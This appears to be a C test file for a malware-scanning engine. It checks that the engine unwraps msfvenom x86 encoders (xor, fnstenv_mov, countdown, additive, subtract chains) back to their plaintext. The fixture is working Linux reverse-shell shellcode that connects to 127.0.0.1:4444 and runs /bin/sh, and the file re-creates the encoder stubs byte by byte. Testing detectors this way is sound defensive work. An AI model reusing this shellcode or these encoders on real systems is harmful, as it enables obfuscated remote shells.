/*
 * msf_x86 - the x86 encoders of msfvenom that carry their parameters in the stub,
 * through the whole engine: the repeating-key xor wrapper and the four dword
 * codings (a constant dword, a countdown, call4, and the additive feedback), and
 * the subtract family (the placeholder template and the sub-eax chain).
 *
 * WHAT IS ASSERTED, for every coding: a wrapper built from the module's own
 * listing, its parameters chosen here and not taken from any one sample, comes
 * back as ONE child that is the reconstructed ELF32 header followed by the
 * plaintext byte for byte. The plaintext is the assertion that matters - a child
 * that has the right length and a wrong key is three objects of noise.
 *
 * WHY THIS EXISTS NOW. These modules carried their own cipher loops, so a mistake
 * in one - a key read in the wrong order, a counter that starts at zero - was a
 * module bug with nothing pinning it. The loops are the host's now (see
 * kofmod/kofdecode.h) and the modules only read the stub, so what is pinned here
 * is the contract between the two: the key bytes, the count and the body address a
 * module reads must be the ones the cipher is handed.
 *
 * The negative is an ELF32 whose entry is ordinary code: nothing is claimed.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "../../libkofeng/kofeng.h"

static int failures;

static void fail(const char *what)
{
	printf("  FAIL %s\n", what);
	failures++;
}

/* The x86 stager's opening: 96 bytes, a multiple of four for the dword codings. */
static const uint8_t payload[96] = {
	0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0x89,0xe1,0xb0,0x66,0xcd,0x80,0x93,
	0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,
	0x11,0x5c,0x89,0xe1,0xb0,0x66,0x50,0x51,0x53,0xb3,0x03,0x89,0xe1,0xcd,0x80,0x52,
	0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x52,0x53,0x89,0xe1,
	0xb0,0x0b,0xcd,0x80,0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0x10,0x32,0x54,0x76,
	0x98,0xba,0xdc,0xfe,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc
};

#define HDR 0x54u       /* the ELF32 header the module puts back */

/* An ELF32 with one executable PT_LOAD covering the file and the entry at `at`. */
static uint64_t build_elf32(uint8_t *f, uint32_t at, const uint8_t *body, uint64_t n)
{
	const uint32_t base = 0x08048000u;
	uint64_t len = at + n;
	uint8_t *ph = f + 52;
	unsigned i;

	memset(f, 0, (size_t)len);
	memcpy(f, "\177ELF\1\1\1", 7);
	f[0x10] = 2;                                    /* ET_EXEC  */
	f[0x12] = 3;                                    /* EM_386   */
	f[0x14] = 1;
	for (i = 0; i < 4; i++)
		f[0x18 + i] = (uint8_t)((base + at) >> (i * 8));
	f[0x1c] = 52;                                   /* e_phoff  */
	f[0x28] = 52;                                   /* ehsize   */
	f[0x2a] = 32;                                   /* phentsize */
	f[0x2c] = 1;                                    /* phnum    */
	ph[0] = 1;                                      /* PT_LOAD  */
	for (i = 0; i < 4; i++) {
		ph[8 + i]  = (uint8_t)(base >> (i * 8));        /* vaddr  */
		ph[12 + i] = (uint8_t)(base >> (i * 8));        /* paddr  */
		ph[16 + i] = (uint8_t)(len >> (i * 8));         /* filesz */
		ph[20 + i] = (uint8_t)(len >> (i * 8));         /* memsz  */
	}
	ph[24] = 5;                                     /* R|X      */
	ph[28] = 0;
	ph[29] = 0x10;                                  /* align 0x1000 */
	memcpy(f + at, body, (size_t)n);
	return len;
}

/* ---- the wrappers, each the module's listing read backwards ---------------- */

/* msf_xor_x86_00: stub, key, terminator, ciphertext, marker. */
static uint64_t wrap_xor(uint8_t *o, const uint8_t *in, uint64_t n, uint8_t term,
			 uint8_t m0, uint8_t m1, const uint8_t *key, uint32_t kl)
{
	static const uint8_t stub[42] = {
		0xeb,0x23,0x5b,0x89,0xdf,0xb0,0x00,0xfc,0xae,0x75,0xfd,0x89,0xf9,
		0x89,0xde,0x8a,0x06,0x30,0x07,0x47,0x66,0x81,0x3f,0x00,0x00,0x74,
		0x08,0x46,0x80,0x3e,0x00,0x75,0xee,0xeb,0xea,0xff,0xe1,0xe8,0xd8,
		0xff,0xff,0xff
	};
	uint64_t at = 42, i;

	memcpy(o, stub, 42);
	o[6] = term;
	o[23] = m0;
	o[24] = m1;
	o[30] = term;
	memcpy(o + at, key, kl);
	at += kl;
	o[at++] = term;
	for (i = 0; i < n; i++)
		o[at + i] = (uint8_t)(in[i] ^ key[i % kl]);
	at += n;
	o[at++] = m0;
	o[at++] = m1;
	return at;
}

/* x86/fnstenv_mov (22 bytes) and x86/call4_dword_xor (24): a constant dword over
 * the body, which follows the stub; `dd` makes the stub's displacement land there. */
static uint64_t wrap_dword(uint8_t *o, int call4, uint32_t key)
{
	static const uint8_t fnstenv[22] = {
		0x6a,0x00,0x59,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x5b,0x81,0x73,0x00,
		0,0,0,0,0x83,0xeb,0xfc,0xe2,0xf4
	};
	static const uint8_t call4s[24] = {
		0x33,0xc9,0x83,0xe9,0x00,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,
		0x76,0x00,0,0,0,0,0x83,0xee,0xfc,0xe2,0xf4
	};
	uint32_t cnt = sizeof payload / 4u, i, k;
	const uint32_t n = call4 ? 24u : 22u;

	memcpy(o, call4 ? call4s : fnstenv, n);
	if (call4) {
		o[4]  = (uint8_t)(-(int)cnt);             /* sub ecx, NN: the negative */
		o[14] = (uint8_t)(n - 10u);               /* body = ep + 10 + DD       */
		for (k = 0; k < 4; k++)
			o[15 + k] = (uint8_t)(key >> (k * 8));
	} else {
		o[1]  = (uint8_t)cnt;
		o[12] = (uint8_t)(n - 3u);                /* body = ep + 3 + DD        */
		for (k = 0; k < 4; k++)
			o[13 + k] = (uint8_t)(key >> (k * 8));
	}
	for (i = 0; i < cnt; i++) {
		uint32_t w = (uint32_t)payload[4u * i] | ((uint32_t)payload[4u * i + 1u] << 8) |
			     ((uint32_t)payload[4u * i + 2u] << 16) |
			     ((uint32_t)payload[4u * i + 3u] << 24);

		w ^= key;
		for (k = 0; k < 4; k++)
			o[n + 4u * i + k] = (uint8_t)(w >> (k * 8));
	}
	return n + sizeof payload;
}

/* x86/countdown (16 bytes): byte k is xored with k + 1. */
static uint64_t wrap_countdown(uint8_t *o)
{
	static const uint8_t stub[16] = {
		0x6a,0x00,0x59,0xe8,0xff,0xff,0xff,0xff,0xc1,0x5e,0x30,0x4c,0x0e,
		0x00,0xe2,0xfa
	};
	uint32_t k;

	memcpy(o, stub, 16);
	o[1]  = (uint8_t)sizeof payload;
	o[13] = (uint8_t)(16u - 8u - 1u);                 /* body = ep + 8 + DD + 1 */
	for (k = 0; k < sizeof payload; k++)
		o[16 + k] = (uint8_t)(payload[k] ^ (uint8_t)(k + 1u));
	return 16u + sizeof payload;
}

/* x86/jmp_call_additive (21 bytes + the call's rel32): the key feeds on the
 * plaintext, and a zero dword ends it. */
static uint64_t wrap_additive(uint8_t *o, uint32_t key)
{
	static const uint8_t stub[21] = {
		0xfc,0xbb,0,0,0,0,0xeb,0x0c,0x5e,0x56,0x31,0x1e,0xad,0x01,0xc3,0x85,
		0xc0,0x75,0xf7,0xc3,0xe8
	};
	uint32_t i, k, cnt = sizeof payload / 4u;
	uint64_t at = 25;

	memcpy(o, stub, 21);
	for (k = 0; k < 4; k++)
		o[2 + k] = (uint8_t)(key >> (k * 8));
	memset(o + 21, 0, 4);                            /* the call's rel32, not read */
	for (i = 0; i <= cnt; i++) {                     /* one past: the zero dword */
		uint32_t pl = 0, c;

		if (i < cnt)
			pl = (uint32_t)payload[4u * i] | ((uint32_t)payload[4u * i + 1u] << 8) |
			     ((uint32_t)payload[4u * i + 2u] << 16) |
			     ((uint32_t)payload[4u * i + 3u] << 24);
		c = pl ^ key;
		for (k = 0; k < 4; k++)
			o[at++] = (uint8_t)(c >> (k * 8));
		key += pl;
	}
	return at;
}

/* x86/nonalpha, nonupper: a template whose placeholder bytes are rebuilt by
 * subtracting a byte from the placeholder. The subtrahends sit in front of the
 * template, and the stub's DD says how many there are. */
static uint64_t wrap_place(uint8_t *o)
{
	static const uint8_t stub[36] = {
		0x66,0xb9,0xff,0xff,0xeb,0x19,0x5e,0x8b,0xfe,0x83,0xc7,0x00,0x8b,0xd7,
		0x3b,0xf2,0x7d,0x0b,0xb0,0x00,0xf2,0xae,0xff,0xcf,0xac,0x28,0x07,0xeb,
		0xf1,0xeb,0x00,0xe8,0xe2,0xff,0xff,0xff
	};
	static const unsigned at[] = { 3, 17, 29, 40, 55, 71, 88 };
	const unsigned k = sizeof at / sizeof at[0];
	uint8_t mark = 0xee, tpl[sizeof payload];
	unsigned i, j;

	/* A placeholder byte the payload does not already hold. */
	for (;; mark--) {
		for (j = 0; j < sizeof payload; j++)
			if (payload[j] == mark)
				break;
		if (j == sizeof payload)
			break;
	}
	memcpy(o, stub, 36);
	o[11] = (uint8_t)k;
	o[19] = mark;
	memcpy(tpl, payload, sizeof payload);
	for (i = 0; i < k; i++) {
		o[36 + i] = (uint8_t)(mark - payload[at[i]]);   /* the subtrahend */
		tpl[at[i]] = mark;                               /* the placeholder */
	}
	memcpy(o + 36 + k, tpl, sizeof tpl);
	return 36u + k + sizeof tpl;
}

/* The same family's dword form: a chain of `sub eax, imm32` and `push eax`, the
 * payload built backwards down the stack. */
static uint64_t wrap_subchain(uint8_t *o)
{
	uint32_t eax = 0, d, i, k, cnt = sizeof payload / 4u;
	unsigned at = 0;

	o[at++] = 0x54;  o[at++] = 0x58;                    /* push esp; pop eax  */
	o[at++] = 0x2d;  memset(o + at, 0, 4);  at += 4;    /* sub eax, 0         */
	o[at++] = 0x25;  memset(o + at, 0, 4);  at += 4;    /* and eax, 0: zeroed */
	for (i = cnt; i-- > 0; ) {                           /* last dword first   */
		d = (uint32_t)payload[4u * i] | ((uint32_t)payload[4u * i + 1u] << 8) |
		    ((uint32_t)payload[4u * i + 2u] << 16) |
		    ((uint32_t)payload[4u * i + 3u] << 24);
		o[at++] = 0x2d;
		for (k = 0; k < 4; k++)
			o[at + k] = (uint8_t)((eax - d) >> (k * 8));
		at += 4;
		o[at++] = 0x50;                                  /* push eax           */
		eax = d;
	}
	o[at++] = 0xff;  o[at++] = 0xe4;                    /* jmp esp: ends it   */
	return at;
}

static uint64_t n_kids;
static uint8_t  last[4096];
static uint64_t last_n;

static int on_object(const char *name, const void *bytes, uint64_t len,
		     const struct kof_result *res, void *user)
{
	(void)res; (void)user;
	if (!strstr(name, "//"))
		return 0;
	n_kids++;
	last_n = len < sizeof last ? len : sizeof last;
	if (bytes)
		memcpy(last, bytes, (size_t)last_n);
	return 0;
}

static int scan(kof_scanner *sc, const char *path, const uint8_t *f, uint64_t n)
{
	struct kof_scan_option opt;
	FILE *fp = fopen(path, "wb");

	if (!fp || fwrite(f, 1, (size_t)n, fp) != (size_t)n) {
		if (fp)
			fclose(fp);
		return 0;
	}
	fclose(fp);
	memset(&opt, 0, sizeof opt);
	opt.max_produced_bytes = 1u << 20;
	opt.max_resident_bytes = 16u << 20;
	opt.max_object_bytes   = 1u << 20;
	n_kids = 0;
	last_n = 0;
	return kscan_path(sc, path, &opt, on_object, NULL) >= 0;
}

/* One wrapper through the engine: one child, an ELF header, then `plain`. */
static void check(kof_scanner *sc, const char *path, const char *what,
		  const uint8_t *wrapper, uint64_t wn, const uint8_t *plain,
		  uint64_t pn)
{
	static uint8_t elf[8192];
	uint64_t ne = build_elf32(elf, HDR, wrapper, wn);
	char msg[160];

	if (!scan(sc, path, elf, ne)) {
		snprintf(msg, sizeof msg, "%s: the scan could not run", what);
		fail(msg);
		return;
	}
	if (n_kids != 1) {
		snprintf(msg, sizeof msg, "%s: %llu children, wanted one", what,
			 (unsigned long long)n_kids);
		fail(msg);
	} else if (last_n < HDR + pn || memcmp(last, "\177ELF", 4) != 0) {
		snprintf(msg, sizeof msg, "%s: the child is not an ELF of the right "
			 "length (%llu)", what, (unsigned long long)last_n);
		fail(msg);
	} else if (memcmp(last + HDR, plain, (size_t)pn) != 0) {
		snprintf(msg, sizeof msg, "%s: the plaintext is wrong", what);
		fail(msg);
	} else {
		printf("  %-28s -> ELF header + %llu bytes, plaintext exact\n", what,
		       (unsigned long long)pn);
	}
}

int main(int argc, char **argv)
{
	const char *db = argc > 1 ? argv[1] : "build/release/databases";
	const char *path = "build/test/msf_x86.tmp";
	static uint8_t w[4096];
	static const uint8_t k1[1] = { 0x10 };
	static const uint8_t k5[5] = { 0xa5, 0x3c, 0x01, 0x6e, 0x99 };
	kof_engine *eng = keng_open(db);
	kof_scanner *sc;
	uint64_t wn;

	if (!eng) {
		printf("msf x86: cannot open %s\n", db);
		return 2;
	}
	sc = kscan_new(eng);
	if (!sc) {
		keng_close(eng);
		return 2;
	}

	/* Two key lengths for the repeating-key wrapper, so a key read short or long
	 * produces the wrong bytes. */
	wn = wrap_xor(w, payload, sizeof payload, 0xcf, 0xe0, 0x22, k1, 1);
	check(sc, path, "xor wrapper, 1 byte key", w, wn, payload, sizeof payload);
	wn = wrap_xor(w, payload, sizeof payload, 0x71, 0xa8, 0xe4, k5, 5);
	check(sc, path, "xor wrapper, 5 byte key", w, wn, payload, sizeof payload);

	wn = wrap_dword(w, 0, 0x5a3cc371u);
	check(sc, path, "fnstenv_mov", w, wn, payload, sizeof payload);
	wn = wrap_dword(w, 1, 0x1f2e3d4cu);
	check(sc, path, "call4_dword_xor", w, wn, payload, sizeof payload);
	wn = wrap_countdown(w);
	check(sc, path, "countdown", w, wn, payload, sizeof payload);
	wn = wrap_additive(w, 0xdeadbeefu);
	check(sc, path, "jmp_call_additive", w, wn, payload, sizeof payload);

	wn = wrap_place(w);
	check(sc, path, "nonalpha / nonupper", w, wn, payload, sizeof payload);
	wn = wrap_subchain(w);
	check(sc, path, "sub eax chain", w, wn, payload, sizeof payload);

	/* The negative: ordinary code at the entry. */
	{
		static uint8_t elf[8192];
		uint64_t ne = build_elf32(elf, HDR, payload, sizeof payload);

		if (!scan(sc, path, elf, ne))
			fail("the negative scan could not run");
		else if (n_kids != 0)
			fail("an unwrapped ELF32 was claimed by a module");
		else
			printf("  ordinary code at the entry   -> no child\n");
	}

	remove(path);
	kscan_free(sc);
	keng_close(eng);
	printf("msf x86: %s\n", failures ? "FAILED" : "ok");
	return failures != 0;
}
